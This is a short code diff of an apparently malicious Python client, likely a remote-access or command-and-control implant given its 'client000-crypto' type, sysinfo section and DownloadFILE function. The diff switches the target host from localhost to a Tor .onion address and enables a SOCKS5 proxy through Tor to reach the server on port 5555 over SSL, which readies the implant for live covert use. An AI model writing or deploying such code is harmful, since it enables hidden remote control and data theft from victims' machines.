@@ -28,8 +28,8 @@ class PKCS7Encoder():
         return text[:-pad]
 
 encoder = PKCS7Encoder()
-#host = 'hcjczulezpxxfw2n.onion'
-host = '127.0.0.1'
+host = 'hcjczulezpxxfw2n.onion'
+#host = '127.0.0.1'
 cType = "client000-crypto"
 
 # sysinfo
@@ -160,7 +160,7 @@ def DownloadFILE(fileName):
 
 
 sock = socks.socksocket()
-#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
+sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 
 ssl_sock = ssl.wrap_socket(sock,
